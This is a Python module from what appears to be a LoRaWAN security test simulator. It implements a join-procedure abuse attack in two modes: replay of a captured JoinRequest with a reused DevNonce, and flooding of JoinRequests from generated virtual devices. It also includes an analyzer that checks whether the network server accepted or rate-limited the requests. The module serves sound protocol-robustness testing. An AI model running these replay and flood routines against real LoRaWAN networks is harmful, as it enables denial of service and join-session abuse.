"""Join procedure abuse attack implementation."""

from __future__ import annotations

import secrets
import time
from logging import Logger
from typing import Any

from lorawan_sim.attacks.analyzer import AttackAnalyzer
from lorawan_sim.attacks.base import AttackConfig, BaseAttack
from lorawan_sim.attacks.packet_capture import CapturedPacket, PacketCapture
from lorawan_sim.domain.device.model import SimulatedDevice
from lorawan_sim.domain.gateway.model import GatewaySimulator
from lorawan_sim.domain.scenario.schema import RadioMetadata
from lorawan_sim.protocol.lorawan.frames import build_join_request


class JoinAbuseAnalyzer(AttackAnalyzer):
    """Analyzer for join procedure abuse attack results."""
    
    def analyze(self, capture: PacketCapture) -> dict[str, Any]:
        """
        Analyze join abuse attack results.
        
        Checks if:
        - Join requests were sent
        - DevNonce reuse was attempted (replay mode)
        - Multiple join requests were sent (flood mode)
        - Join accepts were received (indicates NS acceptance)
        - Rate limiting was detected
        """
        stats = capture.get_stats()
        
        # Count join requests
        join_requests = [p for p in capture.uplinks if p.packet_type == "join_request"]
        join_accepts = [p for p in capture.downlinks if p.packet_type == "join_accept"]
        
        if not join_requests:
            return {
                "success": False,
                "message": "No join requests captured",
                "metrics": {"uplinks_captured": stats["total_uplinks"]},
            }
        
        # Analyze DevNonce usage
        dev_nonces = []
        replayed_dev_nonces = []
        
        for packet in join_requests:
            dev_nonce = packet.metadata.get("dev_nonce")
            if dev_nonce:
                if dev_nonce in dev_nonces:
                    replayed_dev_nonces.append(dev_nonce)
                else:
                    dev_nonces.append(dev_nonce)
        
        # Check for join replay attack
        is_replay_attack = len(replayed_dev_nonces) > 0
        
        # Check for join flooding attack
        is_flood_attack = len(join_requests) > 2
        
        # Calculate rate if flooding
        if len(join_requests) >= 2:
            time_span = join_requests[-1].timestamp - join_requests[0].timestamp
            if time_span > 0:
                joins_per_sec = len(join_requests) / time_span
            else:
                joins_per_sec = 0
        else:
            joins_per_sec = 0
        
        # Analyze Network Server response
        join_accept_ratio = len(join_accepts) / len(join_requests) if join_requests else 0
        
        # Determine attack type and success
        if is_replay_attack:
            attack_type = "join_replay"
            # Success if we replayed DevNonce (NS behavior analysis is secondary)
            success = True
            message = f"Join replay executed: {len(replayed_dev_nonces)} DevNonce reuse(s)"
            
            # Check if NS accepted replayed joins
            replay_acceptance = "accepted" if join_accept_ratio > 0.5 else "rejected"
            message += f" - NS {replay_acceptance} replays"
            
        elif is_flood_attack:
            attack_type = "join_flood"
            success = True
            message = f"Join flood executed: {len(join_requests)} join requests at {joins_per_sec:.2f} req/s"
            
            # Check if NS shows rate limiting signs
            if join_accept_ratio < 0.3:
                message += " - possible rate limiting detected"
            
        else:
            attack_type = "unknown"
            success = True
            message = f"Join abuse executed: {len(join_requests)} join request(s)"
        
        return {
            "success": success,
            "message": message,
            "metrics": {
                "attack_type": attack_type,
                "join_requests_sent": len(join_requests),
                "unique_dev_nonces": len(dev_nonces),
                "replayed_dev_nonces": len(replayed_dev_nonces),
                "join_accepts_received": len(join_accepts),
                "join_accept_ratio": join_accept_ratio,
                "joins_per_second": joins_per_sec,
                "total_uplinks": stats["total_uplinks"],
                "total_downlinks": stats["total_downlinks"],
            },
        }


class JoinAbuseAttack(BaseAttack):
    """
    Join procedure abuse attack implementation.
    
    Supports two attack modes:
    1. Join Replay: Capture and replay JoinRequest with same DevNonce
    2. Join Flood: Send multiple JoinRequests rapidly to stress NS
    
    Tests:
    - DevNonce validation
    - Join request rate limiting
    - Session creation handling
    - OTAA onboarding robustness
    """
    
    def __init__(
        self,
        config: AttackConfig,
        device: SimulatedDevice,
        gateway: GatewaySimulator,
        logger: Logger,
        radio: RadioMetadata,
        mode: str = "replay",
        flood_count: int = 10,
        flood_interval_sec: float = 0.1,
        virtual_devices: int = 1,
    ) -> None:
        super().__init__(config, device, gateway, logger)
        self.radio = radio
        self.mode = mode
        self.flood_count = flood_count
        self.flood_interval_sec = flood_interval_sec
        self.virtual_devices = virtual_devices
        self._captured_join_request: CapturedPacket | None = None
        self._virtual_device_list: list[VirtualDevice] = []
    
    def _create_analyzer(self) -> AttackAnalyzer:
        """Create join abuse analyzer."""
        return JoinAbuseAnalyzer()
    
    def setup(self) -> None:
        """
        Setup phase: start gateway and prepare for attack.
        
        For replay mode:
        1. Start gateway
        2. Device sends legitimate JoinRequest
        3. Capture JoinRequest for replay
        
        For flood mode:
        1. Start gateway
        2. Generate virtual devices
        """
        self.logger.info(f"Join abuse attack setup: mode={self.mode}")
        self.gateway.start()
        
        # Wait for gateway to be ready
        time.sleep(0.5)
        
        if self.mode == "replay":
            # Send legitimate join request to capture
            self.logger.info("Join abuse setup: sending legitimate join request")
            join_request = self.device.build_join_request()
            dev_nonce = self.device.runtime.dev_nonce
            
            self._captured_join_request = self.capture.capture_uplink(
                phy_payload=join_request,
                packet_type="join_request",
                metadata={
                    "phase": "setup",
                    "legitimate": True,
                    "dev_nonce": dev_nonce.hex(),
                },
            )
            
            self.gateway.forward_uplink(join_request, self.radio)
            self.logger.info(
                f"Legitimate JoinRequest sent with DevNonce={dev_nonce.hex()}",
                extra={"dev_nonce": dev_nonce.hex()},
            )
            
            # Wait for potential join accept
            time.sleep(1.0)
            
        elif self.mode == "flood":
            # Generate virtual devices for flooding
            self.logger.info(f"Join abuse setup: generating {self.virtual_devices} virtual devices")
            self._virtual_device_list = self._generate_virtual_devices(self.virtual_devices)
            self.logger.info(f"Generated {len(self._virtual_device_list)} virtual devices")
            
        else:
            raise ValueError(f"Unsupported join abuse mode: {self.mode}")
    
    def execute(self) -> None:
        """
        Execute join abuse attack based on configured mode.
        
        Replay mode:
        - Replays captured JoinRequest with same DevNonce
        - Tests DevNonce validation
        
        Flood mode:
        - Sends multiple JoinRequests from virtual devices
        - Tests rate limiting and session creation handling
        """
        self.logger.info(
            f"Executing join abuse attack: mode={self.mode}",
            extra={"mode": self.mode},
        )
        
        if self.mode == "replay":
            self._execute_join_replay()
        elif self.mode == "flood":
            self._execute_join_flood()
        else:
            raise ValueError(f"Unsupported join abuse mode: {self.mode}")
        
        # Wait for potential Network Server responses
        time.sleep(1.0)
    
    def teardown(self) -> None:
        """Teardown: stop gateway and cleanup."""
        self.logger.info("Join abuse attack teardown: stopping gateway")
        self.gateway.stop()
    
    def _execute_join_replay(self) -> None:
        """Execute join replay attack - replay captured JoinRequest."""
        if not self._captured_join_request:
            raise RuntimeError("No join request captured to replay")
        
        self.logger.info("Executing join replay attack")
        
        # Extract DevNonce from metadata
        dev_nonce_hex = self._captured_join_request.metadata.get("dev_nonce")
        
        # Replay the same JoinRequest (same DevNonce)
        self.logger.info(
            f"Replaying JoinRequest with DevNonce={dev_nonce_hex}",
            extra={"dev_nonce": dev_nonce_hex, "replay": True},
        )
        
        # Capture the replay
        self.capture.capture_uplink(
            phy_payload=self._captured_join_request.phy_payload,
            packet_type="join_request",
            metadata={
                "phase": "execute",
                "replay": True,
                "dev_nonce": dev_nonce_hex,
                "original_timestamp": self._captured_join_request.timestamp,
            },
        )
        
        # Send replay through gateway
        self.gateway.forward_uplink(self._captured_join_request.phy_payload, self.radio)
        
        self.logger.info("Join replay attack executed: 1 replay sent")
    
    def _execute_join_flood(self) -> None:
        """Execute join flood attack - send multiple JoinRequests."""
        self.logger.info(
            f"Executing join flood attack: {self.flood_count} requests",
            extra={"flood_count": self.flood_count},
        )
        
        start_time = time.time()
        
        for i in range(self.flood_count):
            # Select virtual device (round-robin if multiple)
            device_idx = i % len(self._virtual_device_list)
            virtual_device = self._virtual_device_list[device_idx]
            
            # Build JoinRequest from virtual device
            join_request = virtual_device.build_join_request()
            dev_nonce = virtual_device.dev_nonce
            
            self.logger.info(
                f"Sending flood JoinRequest {i + 1}/{self.flood_count} "
                f"from device {virtual_device.dev_eui_hex} with DevNonce={dev_nonce.hex()}",
                extra={
                    "flood_number": i + 1,
                    "total": self.flood_count,
                    "dev_eui": virtual_device.dev_eui_hex,
                    "dev_nonce": dev_nonce.hex(),
                },
            )
            
            # Capture the join request
            self.capture.capture_uplink(
                phy_payload=join_request,
                packet_type="join_request",
                metadata={
                    "phase": "execute",
                    "flood": True,
                    "flood_number": i + 1,
                    "dev_eui": virtual_device.dev_eui_hex,
                    "dev_nonce": dev_nonce.hex(),
                },
            )
            
            # Send through gateway
            self.gateway.forward_uplink(join_request, self.radio)
            
            # Wait between floods (except for last one)
            if i < self.flood_count - 1:
                time.sleep(self.flood_interval_sec)
        
        elapsed = time.time() - start_time
        rate = self.flood_count / elapsed if elapsed > 0 else 0
        
        self.logger.info(
            f"Join flood attack executed: {self.flood_count} requests in {elapsed:.2f}s ({rate:.2f} req/s)",
            extra={
                "requests_sent": self.flood_count,
                "elapsed_sec": elapsed,
                "rate_per_sec": rate,
            },
        )
    
    def _generate_virtual_devices(self, count: int) -> list[VirtualDevice]:
        """
        Generate virtual devices for join flooding.
        
        Args:
            count: Number of virtual devices to generate
        
        Returns:
            List of VirtualDevice instances with unique DevEUIs
        """
        devices = []
        
        for i in range(count):
            # Generate unique DevEUI (use incrementing pattern for simplicity)
            base_eui = 0x0011223344550000
            dev_eui = base_eui + i
            dev_eui_bytes = dev_eui.to_bytes(8, byteorder="big")
            
            # Use same JoinEUI and AppKey as main device for simplicity
            # In real attack, these would vary based on target
            virtual_device = VirtualDevice(
                dev_eui=dev_eui_bytes,
                join_eui=self.device._join_eui,
                app_key=self.device._app_key,
            )
            
            devices.append(virtual_device)
        
        return devices


class VirtualDevice:
    """
    Lightweight virtual device for join flooding attacks.
    
    Similar to SimulatedDevice but optimized for attack scenarios
    where we only need to generate JoinRequests.
    """
    
    def __init__(self, dev_eui: bytes, join_eui: bytes, app_key: bytes) -> None:
        self.dev_eui = dev_eui
        self.join_eui = join_eui
        self.app_key = app_key
        self.dev_nonce: bytes = b""
    
    @property
    def dev_eui_hex(self) -> str:
        """Return DevEUI as hex string."""
        return self.dev_eui.hex()
    
    def build_join_request(self) -> bytes:
        """Build JoinRequest with new DevNonce."""
        self.dev_nonce = secrets.token_bytes(2)
        return build_join_request(
            join_eui=self.join_eui,
            dev_eui=self.dev_eui,
            dev_nonce=self.dev_nonce,
            app_key=self.app_key,
        )
